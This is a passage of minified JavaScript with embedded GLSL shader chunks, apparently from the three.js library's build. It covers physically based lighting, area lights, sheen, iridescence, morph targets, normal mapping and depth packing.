	coords[ 1 ] = normalize( coords[ 1 ] );
	coords[ 2 ] = normalize( coords[ 2 ] );
	coords[ 3 ] = normalize( coords[ 3 ] );
	vec3 vectorFormFactor = vec3( 0.0 );
	vectorFormFactor += LTC_EdgeVectorFormFactor( coords[ 0 ], coords[ 1 ] );
	vectorFormFactor += LTC_EdgeVectorFormFactor( coords[ 1 ], coords[ 2 ] );
	vectorFormFactor += LTC_EdgeVectorFormFactor( coords[ 2 ], coords[ 3 ] );
	vectorFormFactor += LTC_EdgeVectorFormFactor( coords[ 3 ], coords[ 0 ] );
	float result = LTC_ClippedSphereFormFactor( vectorFormFactor );
	return vec3( result );
}
#if defined( USE_SHEEN )
float D_Charlie( float roughness, float dotNH ) {
	float alpha = pow2( roughness );
	float invAlpha = 1.0 / alpha;
	float cos2h = dotNH * dotNH;
	float sin2h = max( 1.0 - cos2h, 0.0078125 );
	return ( 2.0 + invAlpha ) * pow( sin2h, invAlpha * 0.5 ) / ( 2.0 * PI );
}
float V_Neubelt( float dotNV, float dotNL ) {
	return saturate( 1.0 / ( 4.0 * ( dotNL + dotNV - dotNL * dotNV ) ) );
}
vec3 BRDF_Sheen( const in vec3 lightDir, const in vec3 viewDir, const in vec3 normal, vec3 sheenColor, const in float sheenRoughness ) {
	vec3 halfDir = normalize( lightDir + viewDir );
	float dotNL = saturate( dot( normal, lightDir ) );
	float dotNV = saturate( dot( normal, viewDir ) );
	float dotNH = saturate( dot( normal, halfDir ) );
	float D = D_Charlie( sheenRoughness, dotNH );
	float V = V_Neubelt( dotNV, dotNL );
	return sheenColor * ( D * V );
}
#endif
float IBLSheenBRDF( const in vec3 normal, const in vec3 viewDir, const in float roughness ) {
	float dotNV = saturate( dot( normal, viewDir ) );
	float r2 = roughness * roughness;
	float rInv = 1.0 / ( roughness + 0.1 );
	float a = -1.9362 + 1.0678 * roughness + 0.4573 * r2 - 0.8469 * rInv;
	float b = -0.6014 + 0.5538 * roughness - 0.4670 * r2 - 0.1255 * rInv;
	float DG = exp( a * dotNV + b );
	return saturate( DG );
}
vec3 EnvironmentBRDF( const in vec3 normal, const in vec3 viewDir, const in vec3 specularColor, const in float specularF90, const in float roughness ) {
	float dotNV = saturate( dot( normal, viewDir ) );
	vec2 fab = texture2D( dfgLUT, vec2( roughness, dotNV ) ).rg;
	return specularColor * fab.x + specularF90 * fab.y;
}
#ifdef USE_IRIDESCENCE
void computeMultiscatteringIridescence( const in vec3 normal, const in vec3 viewDir, const in vec3 specularColor, const in float specularF90, const in float iridescence, const in vec3 iridescenceF0, const in float roughness, inout vec3 singleScatter, inout vec3 multiScatter ) {
#else
void computeMultiscattering( const in vec3 normal, const in vec3 viewDir, const in vec3 specularColor, const in float specularF90, const in float roughness, inout vec3 singleScatter, inout vec3 multiScatter ) {
#endif
	float dotNV = saturate( dot( normal, viewDir ) );
	vec2 fab = texture2D( dfgLUT, vec2( roughness, dotNV ) ).rg;
	#ifdef USE_IRIDESCENCE
		vec3 Fr = mix( specularColor, iridescenceF0, iridescence );
	#else
		vec3 Fr = specularColor;
	#endif
	vec3 FssEss = Fr * fab.x + specularF90 * fab.y;
	float Ess = fab.x + fab.y;
	float Ems = 1.0 - Ess;
	vec3 Favg = Fr + ( 1.0 - Fr ) * 0.047619;	vec3 Fms = FssEss * Favg / ( 1.0 - Ems * Favg );
	singleScatter += FssEss;
	multiScatter += Fms * Ems;
}
vec3 BRDF_GGX_Multiscatter( const in vec3 lightDir, const in vec3 viewDir, const in vec3 normal, const in PhysicalMaterial material ) {
	vec3 singleScatter = BRDF_GGX( lightDir, viewDir, normal, material );
	float dotNL = saturate( dot( normal, lightDir ) );
	float dotNV = saturate( dot( normal, viewDir ) );
	vec2 dfgV = texture2D( dfgLUT, vec2( material.roughness, dotNV ) ).rg;
	vec2 dfgL = texture2D( dfgLUT, vec2( material.roughness, dotNL ) ).rg;
	vec3 FssEss_V = material.specularColorBlended * dfgV.x + material.specularF90 * dfgV.y;
	vec3 FssEss_L = material.specularColorBlended * dfgL.x + material.specularF90 * dfgL.y;
	float Ess_V = dfgV.x + dfgV.y;
	float Ess_L = dfgL.x + dfgL.y;
	float Ems_V = 1.0 - Ess_V;
	float Ems_L = 1.0 - Ess_L;
	vec3 Favg = material.specularColorBlended + ( 1.0 - material.specularColorBlended ) * 0.047619;
	vec3 Fms = FssEss_V * FssEss_L * Favg / ( 1.0 - Ems_V * Ems_L * Favg + EPSILON );
	float compensationFactor = Ems_V * Ems_L;
	vec3 multiScatter = Fms * compensationFactor;
	return singleScatter + multiScatter;
}
#if NUM_RECT_AREA_LIGHTS > 0
	void RE_Direct_RectArea_Physical( const in RectAreaLight rectAreaLight, const in vec3 geometryPosition, const in vec3 geometryNormal, const in vec3 geometryViewDir, const in vec3 geometryClearcoatNormal, const in PhysicalMaterial material, inout ReflectedLight reflectedLight ) {
		vec3 normal = geometryNormal;
		vec3 viewDir = geometryViewDir;
		vec3 position = geometryPosition;
		vec3 lightPos = rectAreaLight.position;
		vec3 halfWidth = rectAreaLight.halfWidth;
		vec3 halfHeight = rectAreaLight.halfHeight;
		vec3 lightColor = rectAreaLight.color;
		float roughness = material.roughness;
		vec3 rectCoords[ 4 ];
		rectCoords[ 0 ] = lightPos + halfWidth - halfHeight;		rectCoords[ 1 ] = lightPos - halfWidth - halfHeight;
		rectCoords[ 2 ] = lightPos - halfWidth + halfHeight;
		rectCoords[ 3 ] = lightPos + halfWidth + halfHeight;
		vec2 uv = LTC_Uv( normal, viewDir, roughness );
		vec4 t1 = texture2D( ltc_1, uv );
		vec4 t2 = texture2D( ltc_2, uv );
		mat3 mInv = mat3(
			vec3( t1.x, 0, t1.y ),
			vec3(    0, 1,    0 ),
			vec3( t1.z, 0, t1.w )
		);
		vec3 fresnel = ( material.specularColorBlended * t2.x + ( vec3( 1.0 ) - material.specularColorBlended ) * t2.y );
		reflectedLight.directSpecular += lightColor * fresnel * LTC_Evaluate( normal, viewDir, position, mInv, rectCoords );
		reflectedLight.directDiffuse += lightColor * material.diffuseContribution * LTC_Evaluate( normal, viewDir, position, mat3( 1.0 ), rectCoords );
	}
#endif
void RE_Direct_Physical( const in IncidentLight directLight, const in vec3 geometryPosition, const in vec3 geometryNormal, const in vec3 geometryViewDir, const in vec3 geometryClearcoatNormal, const in PhysicalMaterial material, inout ReflectedLight reflectedLight ) {
	float dotNL = saturate( dot( geometryNormal, directLight.direction ) );
	vec3 irradiance = dotNL * directLight.color;
	#ifdef USE_CLEARCOAT
		float dotNLcc = saturate( dot( geometryClearcoatNormal, directLight.direction ) );
		vec3 ccIrradiance = dotNLcc * directLight.color;
		clearcoatSpecularDirect += ccIrradiance * BRDF_GGX_Clearcoat( directLight.direction, geometryViewDir, geometryClearcoatNormal, material );
	#endif
	#ifdef USE_SHEEN
 
 		sheenSpecularDirect += irradiance * BRDF_Sheen( directLight.direction, geometryViewDir, geometryNormal, material.sheenColor, material.sheenRoughness );
 
 		float sheenAlbedoV = IBLSheenBRDF( geometryNormal, geometryViewDir, material.sheenRoughness );
 		float sheenAlbedoL = IBLSheenBRDF( geometryNormal, directLight.direction, material.sheenRoughness );
 
 		float sheenEnergyComp = 1.0 - max3( material.sheenColor ) * max( sheenAlbedoV, sheenAlbedoL );
 
 		irradiance *= sheenEnergyComp;
 
 	#endif
	reflectedLight.directSpecular += irradiance * BRDF_GGX_Multiscatter( directLight.direction, geometryViewDir, geometryNormal, material );
	reflectedLight.directDiffuse += irradiance * BRDF_Lambert( material.diffuseContribution );
}
void RE_IndirectDiffuse_Physical( const in vec3 irradiance, const in vec3 geometryPosition, const in vec3 geometryNormal, const in vec3 geometryViewDir, const in vec3 geometryClearcoatNormal, const in PhysicalMaterial material, inout ReflectedLight reflectedLight ) {
	vec3 diffuse = irradiance * BRDF_Lambert( material.diffuseContribution );
	#ifdef USE_SHEEN
		float sheenAlbedo = IBLSheenBRDF( geometryNormal, geometryViewDir, material.sheenRoughness );
		float sheenEnergyComp = 1.0 - max3( material.sheenColor ) * sheenAlbedo;
		diffuse *= sheenEnergyComp;
	#endif
	reflectedLight.indirectDiffuse += diffuse;
}
void RE_IndirectSpecular_Physical( const in vec3 radiance, const in vec3 irradiance, const in vec3 clearcoatRadiance, const in vec3 geometryPosition, const in vec3 geometryNormal, const in vec3 geometryViewDir, const in vec3 geometryClearcoatNormal, const in PhysicalMaterial material, inout ReflectedLight reflectedLight) {
	#ifdef USE_CLEARCOAT
		clearcoatSpecularIndirect += clearcoatRadiance * EnvironmentBRDF( geometryClearcoatNormal, geometryViewDir, material.clearcoatF0, material.clearcoatF90, material.clearcoatRoughness );
	#endif
	#ifdef USE_SHEEN
		sheenSpecularIndirect += irradiance * material.sheenColor * IBLSheenBRDF( geometryNormal, geometryViewDir, material.sheenRoughness ) * RECIPROCAL_PI;
 	#endif
	vec3 singleScatteringDielectric = vec3( 0.0 );
	vec3 multiScatteringDielectric = vec3( 0.0 );
	vec3 singleScatteringMetallic = vec3( 0.0 );
	vec3 multiScatteringMetallic = vec3( 0.0 );
	#ifdef USE_IRIDESCENCE
		computeMultiscatteringIridescence( geometryNormal, geometryViewDir, material.specularColor, material.specularF90, material.iridescence, material.iridescenceFresnelDielectric, material.roughness, singleScatteringDielectric, multiScatteringDielectric );
		computeMultiscatteringIridescence( geometryNormal, geometryViewDir, material.diffuseColor, material.specularF90, material.iridescence, material.iridescenceFresnelMetallic, material.roughness, singleScatteringMetallic, multiScatteringMetallic );
	#else
		computeMultiscattering( geometryNormal, geometryViewDir, material.specularColor, material.specularF90, material.roughness, singleScatteringDielectric, multiScatteringDielectric );
		computeMultiscattering( geometryNormal, geometryViewDir, material.diffuseColor, material.specularF90, material.roughness, singleScatteringMetallic, multiScatteringMetallic );
	#endif
	vec3 singleScattering = mix( singleScatteringDielectric, singleScatteringMetallic, material.metalness );
	vec3 multiScattering = mix( multiScatteringDielectric, multiScatteringMetallic, material.metalness );
	vec3 totalScatteringDielectric = singleScatteringDielectric + multiScatteringDielectric;
	vec3 diffuse = material.diffuseContribution * ( 1.0 - totalScatteringDielectric );
	vec3 cosineWeightedIrradiance = irradiance * RECIPROCAL_PI;
	vec3 indirectSpecular = radiance * singleScattering;
	indirectSpecular += multiScattering * cosineWeightedIrradiance;
	vec3 indirectDiffuse = diffuse * cosineWeightedIrradiance;
	#ifdef USE_SHEEN
		float sheenAlbedo = IBLSheenBRDF( geometryNormal, geometryViewDir, material.sheenRoughness );
		float sheenEnergyComp = 1.0 - max3( material.sheenColor ) * sheenAlbedo;
		indirectSpecular *= sheenEnergyComp;
		indirectDiffuse *= sheenEnergyComp;
	#endif
	reflectedLight.indirectSpecular += indirectSpecular;
	reflectedLight.indirectDiffuse += indirectDiffuse;
}
#define RE_Direct				RE_Direct_Physical
#define RE_Direct_RectArea		RE_Direct_RectArea_Physical
#define RE_IndirectDiffuse		RE_IndirectDiffuse_Physical
#define RE_IndirectSpecular		RE_IndirectSpecular_Physical
float computeSpecularOcclusion( const in float dotNV, const in float ambientOcclusion, const in float roughness ) {
	return saturate( pow( dotNV + ambientOcclusion, exp2( - 16.0 * roughness - 1.0 ) ) - 1.0 + ambientOcclusion );
}`,rE=`
vec3 geometryPosition = - vViewPosition;
vec3 geometryNormal = normal;
vec3 geometryViewDir = ( isOrthographic ) ? vec3( 0, 0, 1 ) : normalize( vViewPosition );
vec3 geometryClearcoatNormal = vec3( 0.0 );
#ifdef USE_CLEARCOAT
	geometryClearcoatNormal = clearcoatNormal;
#endif
#ifdef USE_IRIDESCENCE
	float dotNVi = saturate( dot( normal, geometryViewDir ) );
	if ( material.iridescenceThickness == 0.0 ) {
		material.iridescence = 0.0;
	} else {
		material.iridescence = saturate( material.iridescence );
	}
	if ( material.iridescence > 0.0 ) {
		material.iridescenceFresnelDielectric = evalIridescence( 1.0, material.iridescenceIOR, dotNVi, material.iridescenceThickness, material.specularColor );
		material.iridescenceFresnelMetallic = evalIridescence( 1.0, material.iridescenceIOR, dotNVi, material.iridescenceThickness, material.diffuseColor );
		material.iridescenceFresnel = mix( material.iridescenceFresnelDielectric, material.iridescenceFresnelMetallic, material.metalness );
		material.iridescenceF0 = Schlick_to_F0( material.iridescenceFresnel, 1.0, dotNVi );
	}
#endif
IncidentLight directLight;
#if ( NUM_POINT_LIGHTS > 0 ) && defined( RE_Direct )
	PointLight pointLight;
	#if defined( USE_SHADOWMAP ) && NUM_POINT_LIGHT_SHADOWS > 0
	PointLightShadow pointLightShadow;
	#endif
	#pragma unroll_loop_start
	for ( int i = 0; i < NUM_POINT_LIGHTS; i ++ ) {
		pointLight = pointLights[ i ];
		getPointLightInfo( pointLight, geometryPosition, directLight );
		#if defined( USE_SHADOWMAP ) && ( UNROLLED_LOOP_INDEX < NUM_POINT_LIGHT_SHADOWS ) && ( defined( SHADOWMAP_TYPE_PCF ) || defined( SHADOWMAP_TYPE_BASIC ) )
		pointLightShadow = pointLightShadows[ i ];
		directLight.color *= ( directLight.visible && receiveShadow ) ? getPointShadow( pointShadowMap[ i ], pointLightShadow.shadowMapSize, pointLightShadow.shadowIntensity, pointLightShadow.shadowBias, pointLightShadow.shadowRadius, vPointShadowCoord[ i ], pointLightShadow.shadowCameraNear, pointLightShadow.shadowCameraFar ) : 1.0;
		#endif
		RE_Direct( directLight, geometryPosition, geometryNormal, geometryViewDir, geometryClearcoatNormal, material, reflectedLight );
	}
	#pragma unroll_loop_end
#endif
#if ( NUM_SPOT_LIGHTS > 0 ) && defined( RE_Direct )
	SpotLight spotLight;
	vec4 spotColor;
	vec3 spotLightCoord;
	bool inSpotLightMap;
	#if defined( USE_SHADOWMAP ) && NUM_SPOT_LIGHT_SHADOWS > 0
	SpotLightShadow spotLightShadow;
	#endif
	#pragma unroll_loop_start
	for ( int i = 0; i < NUM_SPOT_LIGHTS; i ++ ) {
		spotLight = spotLights[ i ];
		getSpotLightInfo( spotLight, geometryPosition, directLight );
		#if ( UNROLLED_LOOP_INDEX < NUM_SPOT_LIGHT_SHADOWS_WITH_MAPS )
		#define SPOT_LIGHT_MAP_INDEX UNROLLED_LOOP_INDEX
		#elif ( UNROLLED_LOOP_INDEX < NUM_SPOT_LIGHT_SHADOWS )
		#define SPOT_LIGHT_MAP_INDEX NUM_SPOT_LIGHT_MAPS
		#else
		#define SPOT_LIGHT_MAP_INDEX ( UNROLLED_LOOP_INDEX - NUM_SPOT_LIGHT_SHADOWS + NUM_SPOT_LIGHT_SHADOWS_WITH_MAPS )
		#endif
		#if ( SPOT_LIGHT_MAP_INDEX < NUM_SPOT_LIGHT_MAPS )
			spotLightCoord = vSpotLightCoord[ i ].xyz / vSpotLightCoord[ i ].w;
			inSpotLightMap = all( lessThan( abs( spotLightCoord * 2. - 1. ), vec3( 1.0 ) ) );
			spotColor = texture2D( spotLightMap[ SPOT_LIGHT_MAP_INDEX ], spotLightCoord.xy );
			directLight.color = inSpotLightMap ? directLight.color * spotColor.rgb : directLight.color;
		#endif
		#undef SPOT_LIGHT_MAP_INDEX
		#if defined( USE_SHADOWMAP ) && ( UNROLLED_LOOP_INDEX < NUM_SPOT_LIGHT_SHADOWS )
		spotLightShadow = spotLightShadows[ i ];
		directLight.color *= ( directLight.visible && receiveShadow ) ? getShadow( spotShadowMap[ i ], spotLightShadow.shadowMapSize, spotLightShadow.shadowIntensity, spotLightShadow.shadowBias, spotLightShadow.shadowRadius, vSpotLightCoord[ i ] ) : 1.0;
		#endif
		RE_Direct( directLight, geometryPosition, geometryNormal, geometryViewDir, geometryClearcoatNormal, material, reflectedLight );
	}
	#pragma unroll_loop_end
#endif
#if ( NUM_DIR_LIGHTS > 0 ) && defined( RE_Direct )
	DirectionalLight directionalLight;
	#if defined( USE_SHADOWMAP ) && NUM_DIR_LIGHT_SHADOWS > 0
	DirectionalLightShadow directionalLightShadow;
	#endif
	#pragma unroll_loop_start
	for ( int i = 0; i < NUM_DIR_LIGHTS; i ++ ) {
		directionalLight = directionalLights[ i ];
		getDirectionalLightInfo( directionalLight, directLight );
		#if defined( USE_SHADOWMAP ) && ( UNROLLED_LOOP_INDEX < NUM_DIR_LIGHT_SHADOWS )
		directionalLightShadow = directionalLightShadows[ i ];
		directLight.color *= ( directLight.visible && receiveShadow ) ? getShadow( directionalShadowMap[ i ], directionalLightShadow.shadowMapSize, directionalLightShadow.shadowIntensity, directionalLightShadow.shadowBias, directionalLightShadow.shadowRadius, vDirectionalShadowCoord[ i ] ) : 1.0;
		#endif
		RE_Direct( directLight, geometryPosition, geometryNormal, geometryViewDir, geometryClearcoatNormal, material, reflectedLight );
	}
	#pragma unroll_loop_end
#endif
#if ( NUM_RECT_AREA_LIGHTS > 0 ) && defined( RE_Direct_RectArea )
	RectAreaLight rectAreaLight;
	#pragma unroll_loop_start
	for ( int i = 0; i < NUM_RECT_AREA_LIGHTS; i ++ ) {
		rectAreaLight = rectAreaLights[ i ];
		RE_Direct_RectArea( rectAreaLight, geometryPosition, geometryNormal, geometryViewDir, geometryClearcoatNormal, material, reflectedLight );
	}
	#pragma unroll_loop_end
#endif
#if defined( RE_IndirectDiffuse )
	vec3 iblIrradiance = vec3( 0.0 );
	vec3 irradiance = getAmbientLightIrradiance( ambientLightColor );
	#if defined( USE_LIGHT_PROBES )
		irradiance += getLightProbeIrradiance( lightProbe, geometryNormal );
	#endif
	#if ( NUM_HEMI_LIGHTS > 0 )
		#pragma unroll_loop_start
		for ( int i = 0; i < NUM_HEMI_LIGHTS; i ++ ) {
			irradiance += getHemisphereLightIrradiance( hemisphereLights[ i ], geometryNormal );
		}
		#pragma unroll_loop_end
	#endif
#endif
#if defined( RE_IndirectSpecular )
	vec3 radiance = vec3( 0.0 );
	vec3 clearcoatRadiance = vec3( 0.0 );
#endif`,aE=`#if defined( RE_IndirectDiffuse )
	#ifdef USE_LIGHTMAP
		vec4 lightMapTexel = texture2D( lightMap, vLightMapUv );
		vec3 lightMapIrradiance = lightMapTexel.rgb * lightMapIntensity;
		irradiance += lightMapIrradiance;
	#endif
	#if defined( USE_ENVMAP ) && defined( STANDARD ) && defined( ENVMAP_TYPE_CUBE_UV )
		iblIrradiance += getIBLIrradiance( geometryNormal );
	#endif
#endif
#if defined( USE_ENVMAP ) && defined( RE_IndirectSpecular )
	#ifdef USE_ANISOTROPY
		radiance += getIBLAnisotropyRadiance( geometryViewDir, geometryNormal, material.roughness, material.anisotropyB, material.anisotropy );
	#else
		radiance += getIBLRadiance( geometryViewDir, geometryNormal, material.roughness );
	#endif
	#ifdef USE_CLEARCOAT
		clearcoatRadiance += getIBLRadiance( geometryViewDir, geometryClearcoatNormal, material.clearcoatRoughness );
	#endif
#endif`,oE=`#if defined( RE_IndirectDiffuse )
	RE_IndirectDiffuse( irradiance, geometryPosition, geometryNormal, geometryViewDir, geometryClearcoatNormal, material, reflectedLight );
#endif
#if defined( RE_IndirectSpecular )
	RE_IndirectSpecular( radiance, iblIrradiance, clearcoatRadiance, geometryPosition, geometryNormal, geometryViewDir, geometryClearcoatNormal, material, reflectedLight );
#endif`,lE=`#if defined( USE_LOGARITHMIC_DEPTH_BUFFER )
	gl_FragDepth = vIsPerspective == 0.0 ? gl_FragCoord.z : log2( vFragDepth ) * logDepthBufFC * 0.5;
#endif`,cE=`#if defined( USE_LOGARITHMIC_DEPTH_BUFFER )
	uniform float logDepthBufFC;
	varying float vFragDepth;
	varying float vIsPerspective;
#endif`,uE=`#ifdef USE_LOGARITHMIC_DEPTH_BUFFER
	varying float vFragDepth;
	varying float vIsPerspective;
#endif`,dE=`#ifdef USE_LOGARITHMIC_DEPTH_BUFFER
	vFragDepth = 1.0 + gl_Position.w;
	vIsPerspective = float( isPerspectiveMatrix( projectionMatrix ) );
#endif`,pE=`#ifdef USE_MAP
	vec4 sampledDiffuseColor = texture2D( map, vMapUv );
	#ifdef DECODE_VIDEO_TEXTURE
		sampledDiffuseColor = sRGBTransferEOTF( sampledDiffuseColor );
	#endif
	diffuseColor *= sampledDiffuseColor;
#endif`,hE=`#ifdef USE_MAP
	uniform sampler2D map;
#endif`,fE=`#if defined( USE_MAP ) || defined( USE_ALPHAMAP )
	#if defined( USE_POINTS_UV )
		vec2 uv = vUv;
	#else
		vec2 uv = ( uvTransform * vec3( gl_PointCoord.x, 1.0 - gl_PointCoord.y, 1 ) ).xy;
	#endif
#endif
#ifdef USE_MAP
	diffuseColor *= texture2D( map, uv );
#endif
#ifdef USE_ALPHAMAP
	diffuseColor.a *= texture2D( alphaMap, uv ).g;
#endif`,mE=`#if defined( USE_POINTS_UV )
	varying vec2 vUv;
#else
	#if defined( USE_MAP ) || defined( USE_ALPHAMAP )
		uniform mat3 uvTransform;
	#endif
#endif
#ifdef USE_MAP
	uniform sampler2D map;
#endif
#ifdef USE_ALPHAMAP
	uniform sampler2D alphaMap;
#endif`,gE=`float metalnessFactor = metalness;
#ifdef USE_METALNESSMAP
	vec4 texelMetalness = texture2D( metalnessMap, vMetalnessMapUv );
	metalnessFactor *= texelMetalness.b;
#endif`,vE=`#ifdef USE_METALNESSMAP
	uniform sampler2D metalnessMap;
#endif`,_E=`#ifdef USE_INSTANCING_MORPH
	float morphTargetInfluences[ MORPHTARGETS_COUNT ];
	float morphTargetBaseInfluence = texelFetch( morphTexture, ivec2( 0, gl_InstanceID ), 0 ).r;
	for ( int i = 0; i < MORPHTARGETS_COUNT; i ++ ) {
		morphTargetInfluences[i] =  texelFetch( morphTexture, ivec2( i + 1, gl_InstanceID ), 0 ).r;
	}
#endif`,xE=`#if defined( USE_MORPHCOLORS )
	vColor *= morphTargetBaseInfluence;
	for ( int i = 0; i < MORPHTARGETS_COUNT; i ++ ) {
		#if defined( USE_COLOR_ALPHA )
			if ( morphTargetInfluences[ i ] != 0.0 ) vColor += getMorph( gl_VertexID, i, 2 ) * morphTargetInfluences[ i ];
		#elif defined( USE_COLOR )
			if ( morphTargetInfluences[ i ] != 0.0 ) vColor += getMorph( gl_VertexID, i, 2 ).rgb * morphTargetInfluences[ i ];
		#endif
	}
#endif`,yE=`#ifdef USE_MORPHNORMALS
	objectNormal *= morphTargetBaseInfluence;
	for ( int i = 0; i < MORPHTARGETS_COUNT; i ++ ) {
		if ( morphTargetInfluences[ i ] != 0.0 ) objectNormal += getMorph( gl_VertexID, i, 1 ).xyz * morphTargetInfluences[ i ];
	}
#endif`,SE=`#ifdef USE_MORPHTARGETS
	#ifndef USE_INSTANCING_MORPH
		uniform float morphTargetBaseInfluence;
		uniform float morphTargetInfluences[ MORPHTARGETS_COUNT ];
	#endif
	uniform sampler2DArray morphTargetsTexture;
	uniform ivec2 morphTargetsTextureSize;
	vec4 getMorph( const in int vertexIndex, const in int morphTargetIndex, const in int offset ) {
		int texelIndex = vertexIndex * MORPHTARGETS_TEXTURE_STRIDE + offset;
		int y = texelIndex / morphTargetsTextureSize.x;
		int x = texelIndex - y * morphTargetsTextureSize.x;
		ivec3 morphUV = ivec3( x, y, morphTargetIndex );
		return texelFetch( morphTargetsTexture, morphUV, 0 );
	}
#endif`,bE=`#ifdef USE_MORPHTARGETS
	transformed *= morphTargetBaseInfluence;
	for ( int i = 0; i < MORPHTARGETS_COUNT; i ++ ) {
		if ( morphTargetInfluences[ i ] != 0.0 ) transformed += getMorph( gl_VertexID, i, 0 ).xyz * morphTargetInfluences[ i ];
	}
#endif`,wE=`float faceDirection = gl_FrontFacing ? 1.0 : - 1.0;
#ifdef FLAT_SHADED
	vec3 fdx = dFdx( vViewPosition );
	vec3 fdy = dFdy( vViewPosition );
	vec3 normal = normalize( cross( fdx, fdy ) );
#else
	vec3 normal = normalize( vNormal );
	#ifdef DOUBLE_SIDED
		normal *= faceDirection;
	#endif
#endif
#if defined( USE_NORMALMAP_TANGENTSPACE ) || defined( USE_CLEARCOAT_NORMALMAP ) || defined( USE_ANISOTROPY )
	#ifdef USE_TANGENT
		mat3 tbn = mat3( normalize( vTangent ), normalize( vBitangent ), normal );
	#else
		mat3 tbn = getTangentFrame( - vViewPosition, normal,
		#if defined( USE_NORMALMAP )
			vNormalMapUv
		#elif defined( USE_CLEARCOAT_NORMALMAP )
			vClearcoatNormalMapUv
		#else
			vUv
		#endif
		);
	#endif
	#if defined( DOUBLE_SIDED ) && ! defined( FLAT_SHADED )
		tbn[0] *= faceDirection;
		tbn[1] *= faceDirection;
	#endif
#endif
#ifdef USE_CLEARCOAT_NORMALMAP
	#ifdef USE_TANGENT
		mat3 tbn2 = mat3( normalize( vTangent ), normalize( vBitangent ), normal );
	#else
		mat3 tbn2 = getTangentFrame( - vViewPosition, normal, vClearcoatNormalMapUv );
	#endif
	#if defined( DOUBLE_SIDED ) && ! defined( FLAT_SHADED )
		tbn2[0] *= faceDirection;
		tbn2[1] *= faceDirection;
	#endif
#endif
vec3 nonPerturbedNormal = normal;`,ME=`#ifdef USE_NORMALMAP_OBJECTSPACE
	normal = texture2D( normalMap, vNormalMapUv ).xyz * 2.0 - 1.0;
	#ifdef FLIP_SIDED
		normal = - normal;
	#endif
	#ifdef DOUBLE_SIDED
		normal = normal * faceDirection;
	#endif
	normal = normalize( normalMatrix * normal );
#elif defined( USE_NORMALMAP_TANGENTSPACE )
	vec3 mapN = texture2D( normalMap, vNormalMapUv ).xyz * 2.0 - 1.0;
	mapN.xy *= normalScale;
	normal = normalize( tbn * mapN );
#elif defined( USE_BUMPMAP )
	normal = perturbNormalArb( - vViewPosition, normal, dHdxy_fwd(), faceDirection );
#endif`,EE=`#ifndef FLAT_SHADED
	varying vec3 vNormal;
	#ifdef USE_TANGENT
		varying vec3 vTangent;
		varying vec3 vBitangent;
	#endif
#endif`,TE=`#ifndef FLAT_SHADED
	varying vec3 vNormal;
	#ifdef USE_TANGENT
		varying vec3 vTangent;
		varying vec3 vBitangent;
	#endif
#endif`,AE=`#ifndef FLAT_SHADED
	vNormal = normalize( transformedNormal );
	#ifdef USE_TANGENT
		vTangent = normalize( transformedTangent );
		vBitangent = normalize( cross( vNormal, vTangent ) * tangent.w );
	#endif
#endif`,CE=`#ifdef USE_NORMALMAP
	uniform sampler2D normalMap;
	uniform vec2 normalScale;
#endif
#ifdef USE_NORMALMAP_OBJECTSPACE
	uniform mat3 normalMatrix;
#endif
#if ! defined ( USE_TANGENT ) && ( defined ( USE_NORMALMAP_TANGENTSPACE ) || defined ( USE_CLEARCOAT_NORMALMAP ) || defined( USE_ANISOTROPY ) )
	mat3 getTangentFrame( vec3 eye_pos, vec3 surf_norm, vec2 uv ) {
		vec3 q0 = dFdx( eye_pos.xyz );
		vec3 q1 = dFdy( eye_pos.xyz );
		vec2 st0 = dFdx( uv.st );
		vec2 st1 = dFdy( uv.st );
		vec3 N = surf_norm;
		vec3 q1perp = cross( q1, N );
		vec3 q0perp = cross( N, q0 );
		vec3 T = q1perp * st0.x + q0perp * st1.x;
		vec3 B = q1perp * st0.y + q0perp * st1.y;
		float det = max( dot( T, T ), dot( B, B ) );
		float scale = ( det == 0.0 ) ? 0.0 : inversesqrt( det );
		return mat3( T * scale, B * scale, N );
	}
#endif`,RE=`#ifdef USE_CLEARCOAT
	vec3 clearcoatNormal = nonPerturbedNormal;
#endif`,PE=`#ifdef USE_CLEARCOAT_NORMALMAP
	vec3 clearcoatMapN = texture2D( clearcoatNormalMap, vClearcoatNormalMapUv ).xyz * 2.0 - 1.0;
	clearcoatMapN.xy *= clearcoatNormalScale;
	clearcoatNormal = normalize( tbn2 * clearcoatMapN );
#endif`,LE=`#ifdef USE_CLEARCOATMAP
	uniform sampler2D clearcoatMap;
#endif
#ifdef USE_CLEARCOAT_NORMALMAP
	uniform sampler2D clearcoatNormalMap;
	uniform vec2 clearcoatNormalScale;
#endif
#ifdef USE_CLEARCOAT_ROUGHNESSMAP
	uniform sampler2D clearcoatRoughnessMap;
#endif`,kE=`#ifdef USE_IRIDESCENCEMAP
	uniform sampler2D iridescenceMap;
#endif
#ifdef USE_IRIDESCENCE_THICKNESSMAP
	uniform sampler2D iridescenceThicknessMap;
#endif`,NE=`#ifdef OPAQUE
diffuseColor.a = 1.0;
#endif
#ifdef USE_TRANSMISSION
diffuseColor.a *= material.transmissionAlpha;
#endif
gl_FragColor = vec4( outgoingLight, diffuseColor.a );`,DE=`vec3 packNormalToRGB( const in vec3 normal ) {
	return normalize( normal ) * 0.5 + 0.5;
}
vec3 unpackRGBToNormal( const in vec3 rgb ) {
	return 2.0 * rgb.xyz - 1.0;
}
const float PackUpscale = 256. / 255.;const float UnpackDownscale = 255. / 256.;const float ShiftRight8 = 1. / 256.;
const float Inv255 = 1. / 255.;
const vec4 PackFactors = vec4( 1.0, 256.0, 256.0 * 256.0, 256.0 * 256.0 * 256.0 );
const vec2 UnpackFactors2 = vec2( UnpackDownscale, 1.0 / PackFactors.g );
const vec3 UnpackFactors3 = vec3( UnpackDownscale / PackFactors.rg, 1.0 / PackFactors.b );
const vec4 UnpackFactors4 = vec4( UnpackDownscale / PackFactors.rgb, 1.0 / PackFactors.a );
vec4 packDepthToRGBA( const in float v ) {
	if( v <= 0.0 )
		return vec4( 0., 0., 0., 0. );
	if( v >= 1.0 )
		return vec4( 1., 1., 1., 1. );
	float vuf;
	float af = modf( v * PackFactors.a, vuf );
	float bf = modf( vuf * ShiftRight8, vuf );
	float gf = modf( vuf * ShiftRight8, vuf );
	return vec4( vuf * Inv255, gf * PackUpscale, bf * PackUpscale, af );
}
vec3 packDepthToRGB( const in float v ) {
	if( v <= 0.0 )
		return vec3( 0., 0., 0. );
	if( v >= 1.0 )
		return vec3( 1., 1., 1. );
	float vuf;
	float bf = modf( v * PackFactors.b, vuf );
	float gf = modf( vuf * ShiftRight8, vuf );
	return vec3( vuf * Inv255, gf * PackUpscale, bf );
}
vec2 packDepthToRG( const in float v ) {
	if( v <= 0.0 )
		return vec2( 0., 0. );
